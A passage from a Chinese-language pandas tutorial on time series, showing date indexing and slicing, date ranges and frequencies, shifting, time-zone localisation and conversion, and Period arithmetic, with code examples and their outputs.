Timestamp(&apos;2011-01-07 00:00:00&apos;) 1ts[stamp] -1.5583649551664842 还有一种更为方便的用法：传入一个可以被解释为日期的字符串： 1ts['1/10/2011'] 0.3722275907128481 1ts['20110110'] 0.3722275907128481 对于较长的时间序列，只需传入“年”或“年月”即可轻松选取数据的切片： 123longer_ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))longer_ts.head() 2000-01-01 -1.005154 2000-01-02 -0.025581 2000-01-03 -1.069827 2000-01-04 0.620630 2000-01-05 0.320359 Freq: D, dtype: float64 1longer_ts['2001'].head() 2001-01-01 0.904721 2001-01-02 -1.321671 2001-01-03 -0.758130 2001-01-04 -0.639765 2001-01-05 -1.898212 Freq: D, dtype: float64 这里，字符串“2001”被解释成年，并根据它选取时间区间。指定月也同样奏效： 1longer_ts['2001-05'].head() 2001-05-01 1.054962 2001-05-02 -0.788939 2001-05-03 -0.439097 2001-05-04 0.036200 2001-05-05 0.458054 Freq: D, dtype: float64 datetime对象也可以进行切片： 1ts[datetime(2011, 1, 7):] 2011-01-07 -1.558365 2011-01-08 0.770966 2011-01-10 0.372228 2011-01-12 -1.640982 dtype: float64 由于大部分时间序列数据都是按照时间先后排序的，因此你也可以用不存在于该时间序列中的时间戳对其进行切片（即范围查询）： 1ts 2011-01-02 0.502699 2011-01-05 1.188837 2011-01-07 -1.558365 2011-01-08 0.770966 2011-01-10 0.372228 2011-01-12 -1.640982 dtype: float64 1ts['1/6/2011':'1/11/2011'] 2011-01-07 -1.558365 2011-01-08 0.770966 2011-01-10 0.372228 dtype: float64 1ts 2011-01-02 0.502699 2011-01-05 1.188837 2011-01-07 -1.558365 2011-01-08 0.770966 2011-01-10 0.372228 2011-01-12 -1.640982 dtype: float64 前面这些操作对DataFrame也有效。例如，对DataFrame的行进行索引： 12345dates = pd.date_range('1/1/2000', periods=100, freq='W-WED')long_df = pd.DataFrame(np.random.randn(100, 4), index=dates, columns=['Colorado', 'Texas', 'New York', 'Ohio'])long_df.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2000-01-05 1.252168 -0.120885 1.323235 0.253597 2000-01-12 -1.124264 1.739674 0.693579 1.562149 2000-01-19 -0.814943 0.409049 -0.794594 -1.158813 2000-01-26 -1.254203 -1.770200 -1.693423 -0.588621 2000-02-02 -0.724392 -1.776080 -0.505409 0.130541 1long_df.loc['5-2001'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2001-05-02 -0.267807 -1.382954 0.904109 0.219650 2001-05-09 0.639089 -0.665502 0.321638 1.234549 2001-05-16 1.172080 -1.194735 0.821372 1.968535 2001-05-23 1.491895 -1.684519 -1.374041 0.072872 2001-05-30 -0.035682 -0.904268 -0.071059 -0.641927 1long_df.loc['2001-5'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Colorado Texas New York Ohio 2001-05-02 -0.267807 -1.382954 0.904109 0.219650 2001-05-09 0.639089 -0.665502 0.321638 1.234549 2001-05-16 1.172080 -1.194735 0.821372 1.968535 2001-05-23 1.491895 -1.684519 -1.374041 0.072872 2001-05-30 -0.035682 -0.904268 -0.071059 -0.641927 带有重复索引的时间序列在某些应用场景中，可能会存在多个观测数据落在同一个时间点上的情况。 123dates = pd.DatetimeIndex(['1/1/2000', '1/2/2000', '1/2/2000', '1/2/2000', '1/3/2000'])dup_ts = pd.Series(np.arange(5), index=dates)dup_ts 2000-01-01 0 2000-01-02 1 2000-01-02 2 2000-01-02 3 2000-01-03 4 dtype: int32 通过检查索引的is_unique属性，我们就可以知道它是不是唯一的： 1dup_ts.index.is_unique False 对这个时间序列进行索引，要么产生标量值，要么产生切片，具体要看所选的时间点是否重复： 1dup_ts['1/3/2000'] 4 1dup_ts['1/2/2000'] 2000-01-02 1 2000-01-02 2 2000-01-02 3 dtype: int32 对具有非唯一时间戳的数据进行聚合。一个办法是使用groupby，并传入level=0： 1grouped = dup_ts.groupby(level=0) 1grouped &lt;pandas.core.groupby.groupby.SeriesGroupBy object at 0x0000000009A3AA90&gt; 1grouped.count() 2000-01-01 1 2000-01-02 3 2000-01-03 1 dtype: int64 1grouped.mean() 2000-01-01 0 2000-01-02 2 2000-01-03 4 dtype: int32 日期的范围、频率以及移动pandas中的原生时间序列一般被认为是不规则的，也就是说，它们没有固定的频率。对于大部分应用程序而言，这是无所谓的。但是，它常常需要以某种相对固定的频率进行分析，比如每日、每月、每15分钟等（这样自然会在时间序列中引入缺失值）。幸运的是，pandas有一整套标准时间序列频率以及用于重采样、频率推断、生成固定频率日期范围的工具。例如，我们可以将之前那个时间序列转换为一个具有固定频率（每日）的时间序列，只需调用resample即可： 1ts 2011-01-02 0.502699 2011-01-05 1.188837 2011-01-07 -1.558365 2011-01-08 0.770966 2011-01-10 0.372228 2011-01-12 -1.640982 dtype: float64 12# 字符串“D”是每天的意思。ts.resample('D') DatetimeIndexResampler [freq=&lt;Day&gt;, axis=0, closed=left, label=left, convention=start, base=0] 频率的转换（或重采样）是一个比较大的主题，稍后将专门用一节来进行讨论。 生成日期范围pandas.date_range可用于根据指定的频率生成指定长度的DatetimeIndex： 12index = pd.date_range('2012-04-01', '2012-06-01')index DatetimeIndex([&apos;2012-04-01&apos;, &apos;2012-04-02&apos;, &apos;2012-04-03&apos;, &apos;2012-04-04&apos;, &apos;2012-04-05&apos;, &apos;2012-04-06&apos;, &apos;2012-04-07&apos;, &apos;2012-04-08&apos;, &apos;2012-04-09&apos;, &apos;2012-04-10&apos;, &apos;2012-04-11&apos;, &apos;2012-04-12&apos;, &apos;2012-04-13&apos;, &apos;2012-04-14&apos;, &apos;2012-04-15&apos;, &apos;2012-04-16&apos;, &apos;2012-04-17&apos;, &apos;2012-04-18&apos;, &apos;2012-04-19&apos;, &apos;2012-04-20&apos;, &apos;2012-04-21&apos;, &apos;2012-04-22&apos;, &apos;2012-04-23&apos;, &apos;2012-04-24&apos;, &apos;2012-04-25&apos;, &apos;2012-04-26&apos;, &apos;2012-04-27&apos;, &apos;2012-04-28&apos;, &apos;2012-04-29&apos;, &apos;2012-04-30&apos;, &apos;2012-05-01&apos;, &apos;2012-05-02&apos;, &apos;2012-05-03&apos;, &apos;2012-05-04&apos;, &apos;2012-05-05&apos;, &apos;2012-05-06&apos;, &apos;2012-05-07&apos;, &apos;2012-05-08&apos;, &apos;2012-05-09&apos;, &apos;2012-05-10&apos;, &apos;2012-05-11&apos;, &apos;2012-05-12&apos;, &apos;2012-05-13&apos;, &apos;2012-05-14&apos;, &apos;2012-05-15&apos;, &apos;2012-05-16&apos;, &apos;2012-05-17&apos;, &apos;2012-05-18&apos;, &apos;2012-05-19&apos;, &apos;2012-05-20&apos;, &apos;2012-05-21&apos;, &apos;2012-05-22&apos;, &apos;2012-05-23&apos;, &apos;2012-05-24&apos;, &apos;2012-05-25&apos;, &apos;2012-05-26&apos;, &apos;2012-05-27&apos;, &apos;2012-05-28&apos;, &apos;2012-05-29&apos;, &apos;2012-05-30&apos;, &apos;2012-05-31&apos;, &apos;2012-06-01&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;) 默认情况下，date_range会产生按天计算的时间点。如果只传入起始或结束日期，那就还得传入一个表示一段时间的数字： 1pd.date_range(start='2012-04-01', periods=20) DatetimeIndex([&apos;2012-04-01&apos;, &apos;2012-04-02&apos;, &apos;2012-04-03&apos;, &apos;2012-04-04&apos;, &apos;2012-04-05&apos;, &apos;2012-04-06&apos;, &apos;2012-04-07&apos;, &apos;2012-04-08&apos;, &apos;2012-04-09&apos;, &apos;2012-04-10&apos;, &apos;2012-04-11&apos;, &apos;2012-04-12&apos;, &apos;2012-04-13&apos;, &apos;2012-04-14&apos;, &apos;2012-04-15&apos;, &apos;2012-04-16&apos;, &apos;2012-04-17&apos;, &apos;2012-04-18&apos;, &apos;2012-04-19&apos;, &apos;2012-04-20&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;) 1pd.date_range(end='2012-06-01', periods=20) DatetimeIndex([&apos;2012-05-13&apos;, &apos;2012-05-14&apos;, &apos;2012-05-15&apos;, &apos;2012-05-16&apos;, &apos;2012-05-17&apos;, &apos;2012-05-18&apos;, &apos;2012-05-19&apos;, &apos;2012-05-20&apos;, &apos;2012-05-21&apos;, &apos;2012-05-22&apos;, &apos;2012-05-23&apos;, &apos;2012-05-24&apos;, &apos;2012-05-25&apos;, &apos;2012-05-26&apos;, &apos;2012-05-27&apos;, &apos;2012-05-28&apos;, &apos;2012-05-29&apos;, &apos;2012-05-30&apos;, &apos;2012-05-31&apos;, &apos;2012-06-01&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;) 起始和结束日期定义了日期索引的严格边界。如果你想要生成一个由每月最后一个工作日组成的日期索引，可以传入”BM”频率（表示business end of month，下表有频率列表），这样就只会包含时间间隔内（或刚好在边界上的）符合频率要求的日期： 1pd.date_range('2000-01-01', '2000-12-01', freq='BM') DatetimeIndex([&apos;2000-01-31&apos;, &apos;2000-02-29&apos;, &apos;2000-03-31&apos;, &apos;2000-04-28&apos;, &apos;2000-05-31&apos;, &apos;2000-06-30&apos;, &apos;2000-07-31&apos;, &apos;2000-08-31&apos;, &apos;2000-09-29&apos;, &apos;2000-10-31&apos;, &apos;2000-11-30&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;BM&apos;) 基本的时间序列频率 date_range默认会保留起始和结束时间戳的时间信息（如果有的话）： 1pd.date_range('2012-05-02 12:56:31', periods=5) DatetimeIndex([&apos;2012-05-02 12:56:31&apos;, &apos;2012-05-03 12:56:31&apos;, &apos;2012-05-04 12:56:31&apos;, &apos;2012-05-05 12:56:31&apos;, &apos;2012-05-06 12:56:31&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;) 有时，虽然起始和结束日期带有时间信息，但你希望产生一组被规范化（normalize）到午夜的时间戳。normalize选项即可实现该功能： 1pd.date_range('2012-05-02 12:56:31', periods=5, normalize=True) DatetimeIndex([&apos;2012-05-02&apos;, &apos;2012-05-03&apos;, &apos;2012-05-04&apos;, &apos;2012-05-05&apos;, &apos;2012-05-06&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;) 频率和日期偏移量pandas中的频率是由一个基础频率（base frequency）和一个乘数组成的。基础频率通常以一个字符串别名表示，比如”M”表示每月，”H”表示每小时。对于每个基础频率，都有一个被称为日期偏移量（date offset）的对象与之对应。例如，按小时计算的频率可以用Hour类表示： 123from pandas.tseries.offsets import Hour, Minutehour = Hour()hour &lt;Hour&gt; 传入一个整数即可定义偏移量的倍数： 12four_hours = Hour(4)four_hours &lt;4 * Hours&gt; 一般来说，无需明确创建这样的对象，只需使用诸如”H”或”4H”这样的字符串别名即可。在基础频率前面放上一个整数即可创建倍数： 1pd.date_range('2000-01-01', '2000-01-03 23:59', freq='4h') DatetimeIndex([&apos;2000-01-01 00:00:00&apos;, &apos;2000-01-01 04:00:00&apos;, &apos;2000-01-01 08:00:00&apos;, &apos;2000-01-01 12:00:00&apos;, &apos;2000-01-01 16:00:00&apos;, &apos;2000-01-01 20:00:00&apos;, &apos;2000-01-02 00:00:00&apos;, &apos;2000-01-02 04:00:00&apos;, &apos;2000-01-02 08:00:00&apos;, &apos;2000-01-02 12:00:00&apos;, &apos;2000-01-02 16:00:00&apos;, &apos;2000-01-02 20:00:00&apos;, &apos;2000-01-03 00:00:00&apos;, &apos;2000-01-03 04:00:00&apos;, &apos;2000-01-03 08:00:00&apos;, &apos;2000-01-03 12:00:00&apos;, &apos;2000-01-03 16:00:00&apos;, &apos;2000-01-03 20:00:00&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;4H&apos;) 大部分偏移量对象都可通过加法进行连接： 1Hour(2) + Minute(30) &lt;150 * Minutes&gt; 同理，你也可以传入频率字符串（如”2h30min”），这种字符串可以被高效地解析为等效的表达式： 1pd.date_range('2000-01-01', periods=10, freq='1h30min') DatetimeIndex([&apos;2000-01-01 00:00:00&apos;, &apos;2000-01-01 01:30:00&apos;, &apos;2000-01-01 03:00:00&apos;, &apos;2000-01-01 04:30:00&apos;, &apos;2000-01-01 06:00:00&apos;, &apos;2000-01-01 07:30:00&apos;, &apos;2000-01-01 09:00:00&apos;, &apos;2000-01-01 10:30:00&apos;, &apos;2000-01-01 12:00:00&apos;, &apos;2000-01-01 13:30:00&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;90T&apos;) 时间序列的基础频率 WOM日期WOM（Week Of Month）是一种非常实用的频率类，它以WOM开头。它使你能获得诸如“每月第3个星期五”之类的日期： 12rng = pd.date_range('2012-01-01', '2012-09-01', freq='WOM-3FRI')rng DatetimeIndex([&apos;2012-01-20&apos;, &apos;2012-02-17&apos;, &apos;2012-03-16&apos;, &apos;2012-04-20&apos;, &apos;2012-05-18&apos;, &apos;2012-06-15&apos;, &apos;2012-07-20&apos;, &apos;2012-08-17&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;WOM-3FRI&apos;) 1list(rng) [Timestamp(&apos;2012-01-20 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-02-17 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-03-16 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-04-20 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-05-18 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-06-15 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-07-20 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;), Timestamp(&apos;2012-08-17 00:00:00&apos;, freq=&apos;WOM-3FRI&apos;)] 移动（超前和滞后）数据移动（shifting）指的是沿着时间轴将数据前移或后移。Series和DataFrame都有一个shift方法用于执行单纯的前移或后移操作，保持索引不变： 123ts = pd.Series(np.random.randn(4), index=pd.date_range('1/1/2000', periods=4, freq='M'))ts 2000-01-31 -3.150432 2000-02-29 0.426478 2000-03-31 -1.580138 2000-04-30 -0.454702 Freq: M, dtype: float64 1ts.shift(2) 2000-01-31 NaN 2000-02-29 NaN 2000-03-31 -3.150432 2000-04-30 0.426478 Freq: M, dtype: float64 1ts.shift(-2) 2000-01-31 -1.580138 2000-02-29 -0.454702 2000-03-31 NaN 2000-04-30 NaN Freq: M, dtype: float64 当我们这样进行移动时，就会在时间序列的前面或后面产生缺失数据。 shift通常用于计算一个时间序列或多个时间序列（如DataFrame的列）中的百分比变化。可以这样表达： 1ts / ts.shift(1) - 1 2000-01-31 NaN 2000-02-29 -1.135371 2000-03-31 -4.705091 2000-04-30 -0.712239 Freq: M, dtype: float64 由于单纯的移位操作不会修改索引，所以部分数据会被丢弃。因此，如果频率已知，则可以将其传给shift以便实现对时间戳进行位移而不是对数据进行简单位移： 12# 加两个月ts.shift(2, freq='M') 2000-03-31 -3.150432 2000-04-30 0.426478 2000-05-31 -1.580138 2000-06-30 -0.454702 Freq: M, dtype: float64 还可以使用其他频率，于是你就能非常灵活地对数据进行超前和滞后处理了： 12# 加三天ts.shift(3, freq='D') 2000-02-03 -3.150432 2000-03-03 0.426478 2000-04-03 -1.580138 2000-05-03 -0.454702 dtype: float64 通过偏移量对日期进行位移pandas的日期偏移量还可以用在datetime或Timestamp对象上： 123from pandas.tseries.offsets import Day, MonthEndnow = datetime(2011, 11, 17)now + 3 * Day() Timestamp(&apos;2011-11-20 00:00:00&apos;) 如果加的是锚点偏移量（比如MonthEnd），第一次增量会将原日期向前滚动到符合频率规则的下一个日期： 1now datetime.datetime(2011, 11, 17, 0, 0) 12# 月末now + MonthEnd() Timestamp(&apos;2011-11-30 00:00:00&apos;) 12# 两个月末now + MonthEnd(2) Timestamp(&apos;2011-12-31 00:00:00&apos;) 通过锚点偏移量的rollforward和rollback方法，可明确地将日期向前或向后“滚动”： 1offset = MonthEnd() 1offset.rollforward(now) Timestamp(&apos;2011-11-30 00:00:00&apos;) 1offset.rollback(now) Timestamp(&apos;2011-10-31 00:00:00&apos;) 日期偏移量还有一个巧妙的用法，即结合groupby使用这两个“滚动”方法： 123ts = pd.Series(np.random.randn(20), index=pd.date_range('1/15/2000', periods=20, freq='4d'))ts 2000-01-15 -0.182953 2000-01-19 -0.991147 2000-01-23 -0.014200 2000-01-27 -0.019404 2000-01-31 1.417325 2000-02-04 0.558435 2000-02-08 1.092113 2000-02-12 -0.463639 2000-02-16 -0.232902 2000-02-20 0.461556 2000-02-24 -2.170060 2000-02-28 -0.409881 2000-03-03 0.156696 2000-03-07 -0.846032 2000-03-11 0.450076 2000-03-15 0.383532 2000-03-19 0.162644 2000-03-23 -0.038723 2000-03-27 1.229935 2000-03-31 1.217698 Freq: 4D, dtype: float64 12# 索引用月末的一天ts.groupby(offset.rollforward).mean() 2000-01-31 0.041924 2000-02-29 -0.166340 2000-03-31 0.339478 dtype: float64 当然，更简单、更快速地实现该功能的办法是使用resample， 后面会进行介绍 1ts.resample('M').mean() 2000-01-31 0.041924 2000-02-29 -0.166340 2000-03-31 0.339478 Freq: M, dtype: float64 时区处理时间序列处理工作中最让人不爽的就是对时区的处理。许多人都选择以协调世界时（UTC，它是格林尼治标准时间（Greenwich Mean Time）的接替者，目前已经是国际标准了）来处理时间序列。时区是以UTC偏移量的形式表示的。例如，夏令时期间，纽约比UTC慢4小时，而在全年其他时间则比UTC慢5小时。在Python中，时区信息来自第三方库pytz，它使Python可以使用Olson数据库（汇编了世界时区信息）。这对历史数据非常重要，这是因为由于各地政府的各种突发奇想，夏令时转变日期（甚至UTC偏移量）已经发生过多次改变了。就拿美国来说，DST转变时间自1900年以来就改变过多次！有关pytz库的更多信息，请查阅其文档。就本书而言，由于pandas包装了pytz的功能，因此你可以不用记忆其API，只要记得时区的名称即可。时区名可以在shell中看到，也可以通过文档查看： 12import pytzpytz.common_timezones[-5:] [&apos;US/Eastern&apos;, &apos;US/Hawaii&apos;, &apos;US/Mountain&apos;, &apos;US/Pacific&apos;, &apos;UTC&apos;] 要从pytz中获取时区对象，使用pytz.timezone即可： 12tz = pytz.timezone('America/New_York')tz &lt;DstTzInfo &apos;America/New_York&apos; LMT-1 day, 19:04:00 STD&gt; pandas中的方法既可以接受时区名也可以接受这些对象。 时区本地化和转换默认情况下，pandas中的时间序列是单纯（naive）的时区。 12rng = pd.date_range('3/9/2012 9:30', periods=6, freq='D')rng DatetimeIndex([&apos;2012-03-09 09:30:00&apos;, &apos;2012-03-10 09:30:00&apos;, &apos;2012-03-11 09:30:00&apos;, &apos;2012-03-12 09:30:00&apos;, &apos;2012-03-13 09:30:00&apos;, &apos;2012-03-14 09:30:00&apos;], dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;) 12ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 2012-03-09 09:30:00 1.206028 2012-03-10 09:30:00 -1.239482 2012-03-11 09:30:00 -1.594181 2012-03-12 09:30:00 1.342129 2012-03-13 09:30:00 1.791927 2012-03-14 09:30:00 0.511703 Freq: D, dtype: float64 其时间索引的 tz 字段(时区)为 None： 1print(ts.index.tz) None 可以用时区集生成日期范围： 12temp = pd.date_range('3/9/2012 9:30', periods=10, freq='D', tz='UTC')temp DatetimeIndex([&apos;2012-03-09 09:30:00+00:00&apos;, &apos;2012-03-10 09:30:00+00:00&apos;, &apos;2012-03-11 09:30:00+00:00&apos;, &apos;2012-03-12 09:30:00+00:00&apos;, &apos;2012-03-13 09:30:00+00:00&apos;, &apos;2012-03-14 09:30:00+00:00&apos;, &apos;2012-03-15 09:30:00+00:00&apos;, &apos;2012-03-16 09:30:00+00:00&apos;, &apos;2012-03-17 09:30:00+00:00&apos;, &apos;2012-03-18 09:30:00+00:00&apos;], dtype=&apos;datetime64[ns, UTC]&apos;, freq=&apos;D&apos;) 1temp.tz &lt;UTC&gt; 本地化的转换是通过 tz_localize 方法处理的：(也就是没有时区(本地时区)转换成指定时区) 1ts 2012-03-09 09:30:00 1.206028 2012-03-10 09:30:00 -1.239482 2012-03-11 09:30:00 -1.594181 2012-03-12 09:30:00 1.342129 2012-03-13 09:30:00 1.791927 2012-03-14 09:30:00 0.511703 Freq: D, dtype: float64 12ts_utc = ts.tz_localize('UTC')ts_utc 2012-03-09 09:30:00+00:00 1.206028 2012-03-10 09:30:00+00:00 -1.239482 2012-03-11 09:30:00+00:00 -1.594181 2012-03-12 09:30:00+00:00 1.342129 2012-03-13 09:30:00+00:00 1.791927 2012-03-14 09:30:00+00:00 0.511703 Freq: D, dtype: float64 1ts_utc.index.tz &lt;UTC&gt; 一旦时间序列被本地化转到某个特定时区，就可以用 tz_convert 将其转换到别的时区了： 1ts_utc.tz_convert('America/New_York') 2012-03-09 04:30:00-05:00 1.206028 2012-03-10 04:30:00-05:00 -1.239482 2012-03-11 05:30:00-04:00 -1.594181 2012-03-12 05:30:00-04:00 1.342129 2012-03-13 05:30:00-04:00 1.791927 2012-03-14 05:30:00-04:00 0.511703 Freq: D, dtype: float64 tz_localize 和 tz_convert 也是 DatetimeIndex 的实例方法： 1ts.index.tz_localize('Asia/Shanghai') DatetimeIndex([&apos;2012-03-09 09:30:00+08:00&apos;, &apos;2012-03-10 09:30:00+08:00&apos;, &apos;2012-03-11 09:30:00+08:00&apos;, &apos;2012-03-12 09:30:00+08:00&apos;, &apos;2012-03-13 09:30:00+08:00&apos;, &apos;2012-03-14 09:30:00+08:00&apos;], dtype=&apos;datetime64[ns, Asia/Shanghai]&apos;, freq=&apos;D&apos;) Timestamp对象跟时间序列和日期范围差不多，独立的 Timestamp 对象也能被从单纯型（naive）本地化转为时区意识型（time zone-aware），并从一个时区转换到另一个时区： 12stamp = pd.Timestamp('2011-03-12 04:00')print(stamp.tz) None 12stamp_utc = stamp.tz_localize('utc')stamp_utc.tz &lt;UTC&gt; 1stamp_utc.tz_convert('America/New_York') Timestamp(&apos;2011-03-11 23:00:00-0500&apos;, tz=&apos;America/New_York&apos;) 在创建Timestamp时，还可以传入一个时区信息： 12stamp_moscow = pd.Timestamp('2011-03-12 04:00', tz='Europe/Moscow')stamp_moscow Timestamp(&apos;2011-03-12 04:00:00+0300&apos;, tz=&apos;Europe/Moscow&apos;) 时区意识型Timestamp对象在内部保存了一个UTC时间戳值（自UNIX纪元（1970年1月1日）算起的纳秒数）。这个UTC值在时区转换过程中是不会发生变化的： 1stamp_utc.value 1299902400000000000 1stamp_utc.tz_convert('America/New_York').value 1299902400000000000 当使用 pandas 的 DateOffset 对象执行时间算术运算时，运算过程会自动关注是否存在夏令时转变期。 这里，我们创建了在DST转变之前的时间戳。首先，来看夏令时转变前的30分钟： 123from pandas.tseries.offsets import Hourstamp = pd.Timestamp('2012-03-12 01:30', tz='US/Eastern')stamp Timestamp(&apos;2012-03-12 01:30:00-0400&apos;, tz=&apos;US/Eastern&apos;) 1stamp + Hour() Timestamp(&apos;2012-03-12 02:30:00-0400&apos;, tz=&apos;US/Eastern&apos;) 然后，夏令时转变前90分钟： 12stamp = pd.Timestamp('2012-11-04 00:30', tz='US/Eastern')stamp Timestamp(&apos;2012-11-04 00:30:00-0400&apos;, tz=&apos;US/Eastern&apos;) 1stamp + 2 * Hour() Timestamp(&apos;2012-11-04 01:30:00-0500&apos;, tz=&apos;US/Eastern&apos;) 不同时区之间的运算如果两个时间序列的时区不同，在将它们合并到一起时，最终结果就会是UTC。由于时间戳其实是以UTC存储的，所以这是一个很简单的运算，并不需要发生任何转换： 123rng = pd.date_range('3/7/2012 9:30', periods=10, freq='B')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 2012-03-07 09:30:00 -0.204868 2012-03-08 09:30:00 -0.921229 2012-03-09 09:30:00 1.727979 2012-03-12 09:30:00 1.019146 2012-03-13 09:30:00 1.690955 2012-03-14 09:30:00 -0.156478 2012-03-15 09:30:00 0.655796 2012-03-16 09:30:00 0.229343 2012-03-19 09:30:00 2.329904 2012-03-20 09:30:00 0.600509 Freq: B, dtype: float64 12ts1 = ts[:7].tz_localize('Europe/London')ts1 2012-03-07 09:30:00+00:00 -0.204868 2012-03-08 09:30:00+00:00 -0.921229 2012-03-09 09:30:00+00:00 1.727979 2012-03-12 09:30:00+00:00 1.019146 2012-03-13 09:30:00+00:00 1.690955 2012-03-14 09:30:00+00:00 -0.156478 2012-03-15 09:30:00+00:00 0.655796 Freq: B, dtype: float64 12ts2 = ts1[2:].tz_convert('Europe/Moscow')ts2 2012-03-09 13:30:00+04:00 1.727979 2012-03-12 13:30:00+04:00 1.019146 2012-03-13 13:30:00+04:00 1.690955 2012-03-14 13:30:00+04:00 -0.156478 2012-03-15 13:30:00+04:00 0.655796 Freq: B, dtype: float64 12result = ts1 + ts2result 2012-03-07 09:30:00+00:00 NaN 2012-03-08 09:30:00+00:00 NaN 2012-03-09 09:30:00+00:00 3.455958 2012-03-12 09:30:00+00:00 2.038293 2012-03-13 09:30:00+00:00 3.381910 2012-03-14 09:30:00+00:00 -0.312956 2012-03-15 09:30:00+00:00 1.311593 Freq: B, dtype: float64 1result.index DatetimeIndex([&apos;2012-03-07 09:30:00+00:00&apos;, &apos;2012-03-08 09:30:00+00:00&apos;, &apos;2012-03-09 09:30:00+00:00&apos;, &apos;2012-03-12 09:30:00+00:00&apos;, &apos;2012-03-13 09:30:00+00:00&apos;, &apos;2012-03-14 09:30:00+00:00&apos;, &apos;2012-03-15 09:30:00+00:00&apos;], dtype=&apos;datetime64[ns, UTC]&apos;, freq=&apos;B&apos;) 时期(Period)及其算术运算时期（period）表示的是时间区间，比如数日、数月、数季、数年等。Period类所表示的就是这种数据类型，其构造函数需要用到一个字符串或整数和之前提到的时间频率（搜 时间序列的基础频率） 12p = pd.Period(2007, freq='A-DEC')p Period(&apos;2007&apos;, &apos;A-DEC&apos;) 这里，这个Period对象表示的是从2007年1月1日到2007年12月31日之间的整段时间。 1p + 5 Period(&apos;2012&apos;, &apos;A-DEC&apos;) 1p - 2 Period(&apos;2005&apos;, &apos;A-DEC&apos;) 如果两个Period对象拥有相同的频率，则它们的差就是它们之间的单位数量： 1pd.Period('2014', freq='A-DEC') - p 7 period_range函数可用于创建规则的时期范围： 12rng = pd.period_range('2000-01-01', '2000-06-30', freq='M')rng PeriodIndex([&apos;2000-01&apos;, &apos;2000-02&apos;, &apos;2000-03&apos;, &apos;2000-04&apos;, &apos;2000-05&apos;, &apos;2000-06&apos;], dtype=&apos;period[M]&apos;, freq=&apos;M&apos;) PeriodIndex类保存了一组Period，它可以在任何pandas数据结构中被用作轴索引： 1pd.Series(np.random.randn(6), index=rng) 2000-01 -1.975257 2000-02 -1.347283 2000-03 -0.117589 2000-04 -0.323535 2000-05 0.065720 2000-06 -1.698198 Freq: M, dtype: float64 如果你有一个字符串数组，你也可以使用PeriodIndex类： 123values = ['2001Q3', '2002Q2', '2003Q1']index = pd.PeriodIndex(values, freq='Q-DEC')index PeriodIndex([&apos;2001Q3&apos;, &apos;2002Q2&apos;, &apos;2003Q1&apos;], dtype=&apos;period[Q-DEC]&apos;, freq=&apos;Q-DEC&apos;) 时期的频率转换Period和PeriodIndex对象都可以通过其asfreq方法被转换成别的频率。假设我们有一个年度时期，希望将其转换为当年年初或年末的一个月度时期。该任务非常简单： 12p = pd.Period('2007', freq='A-DEC')p Period(&apos;2007&apos;, &apos;A-DEC&apos;) 1p.asfreq('M', how='start') Period(&apos;2007-01&apos;, &apos;M&apos;) 1p.asfreq('M', how='end') Period(&apos;2007-12&apos;, &apos;M&apos;) 你可以将 Period(&#39;2007&#39;,&#39;A-DEC&#39;) 看做一个被划分为多个月度时期的时间段中的游标。 在将高频率转换为低频率时，超时期（superperiod）是由子时期（subperiod）所属的位置决定的。例如，在A-JUN频率中，月份“2007年8月”实际上是属于周期“2008年”的： 12p = pd.Period('Aug-2007', 'M')p.asfreq('A-JUN') Period(&apos;2008&apos;, &apos;A-JUN&apos;) 完整的 PeriodIndex 或 TimeSeries 的频率转换方式也是如此： 123rng = pd.period_range('2006', '2009', freq='A-DEC')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 2006 1.020120 2007 -0.377748 2008 -0.058147 2009 -1.282297 Freq: A-DEC, dtype: float64 1ts.asfreq('M', how='start') 2006-01 1.020120 2007-01 -0.377748 2008-01 -0.058147 2009-01 -1.282297 Freq: M, dtype: float64 这里，根据年度时期的第一个月，每年的时期被取代为每月的时期。如果我们想要每年的最后一个工作日，我们可以使用“B”频率，并指明想要该时期的末尾： 1ts.asfreq('B', how='end') 2006-12-29 1.020120 2007-12-31 -0.377748 2008-12-31 -0.058147 2009-12-31 -1.282297 Freq: B, dtype: float64 按季度计算的时期频率季度型数据在会计、金融等领域中很常见。许多季度型数据都会涉及“财年末”的概念，通常是一年12个月中某月的最后一个日历日或工作日。就这一点来说，时期”2012Q4”根据财年末的不同会有不同的含义。pandas支持12种可能的季度型频率，即Q-JAN到Q-DEC： 12p = pd.Period('2012Q4', freq='Q-JAN')p Period(&apos;2012Q4&apos;, &apos;Q-JAN&apos;) 在以1月结束的财年中，2012Q4是从11月到1月（将其转换为日型频率就明白了）。下图对此进行了说明： 1p.asfreq('D', 'start') Period(&apos;2011-11-01&apos;, &apos;D&apos;) 1p.asfreq('D', 'end') Period(&apos;2012-01-31&apos;, &apos;D&apos;) 因此，Period之间的算术运算会非常简单。例如，要获取该季度倒数第二个工作日下午4点的时间戳，你可以这样： 12p4pm = (p.asfreq('B', 'e') - 1).asfreq('T', 's') + 16 * 60p4pm 